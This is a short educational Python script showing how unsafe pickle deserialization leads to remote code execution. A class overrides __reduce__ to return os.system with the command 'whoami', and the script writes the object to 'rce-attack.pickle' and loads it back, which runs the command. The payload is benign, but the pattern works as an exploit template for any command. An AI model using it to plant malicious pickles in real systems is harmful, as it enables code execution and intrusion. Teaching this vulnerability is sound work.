#example of unsafe de-serialization
import pickle
import os

#1. creating a Evil class which has our malicious payload command (‘whoami’)
class MyEvilPickle(object):
    def __reduce__(self):
        '''
        Whenever you try to pickle (serialize) an object, there will be some properties that may not serialize well. 
        For instance, an open file handle (open resource), pickle won’t know how to handle the object and will throw an error. 
        You can tell the pickle module how to handle these types of objects natively within a class directly by overriding “reduce”.
        '''
        return (os.system, ('whoami', ))

#2. serializing the malicious class
pickle_data = pickle.dumps(MyEvilPickle())
#storing the serialized output into a file in current directory
with open('rce-attack.pickle', 'wb') as file:
    file.write(pickle_data)

#3. reading the malicious serialized data and de-serializing it
with open('rce-attack.pickle', 'rb') as file:
    pickle_data = file.read()
    my_data = pickle.loads(pickle_data)

